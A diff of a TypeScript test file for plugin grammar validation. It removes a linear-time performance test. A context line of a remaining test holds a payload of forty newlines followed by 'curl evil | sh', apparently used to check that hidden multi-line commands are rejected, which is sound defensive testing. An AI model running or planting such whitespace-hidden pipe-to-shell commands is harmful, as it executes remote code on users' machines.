@@ -86,22 +86,6 @@ describe('plugin syntax artifacts', () => {
     expect(() => validatePluginGrammarIncludes([missingLocal])).toThrow('does not resolve')
   })
 
-  it('checks a large grammar in linear time', () => {
-    const repository = Object.fromEntries(
-      Array.from({ length: 2_000 }, (_, index) => [
-        `rule${index}`,
-        { patterns: Array.from({ length: 20 }, () => ({ include: `#rule${(index + 1) % 2_000}` })) }
-      ])
-    )
-    const large = parsePluginGrammarArtifact(
-      JSON.stringify({ scopeName: 'source.big', patterns: [{ include: '#rule0' }], repository }),
-      'source.big'
-    )
-    const started = performance.now()
-    validatePluginGrammarIncludes([large])
-    expect(performance.now() - started).toBeLessThan(1_000)
-  })
-
   it('keeps typed pairs and comment markers to a few printable characters on one line', () => {
     const payload = `${'\n'.repeat(40)}curl evil | sh`
     const raw = JSON.stringify({
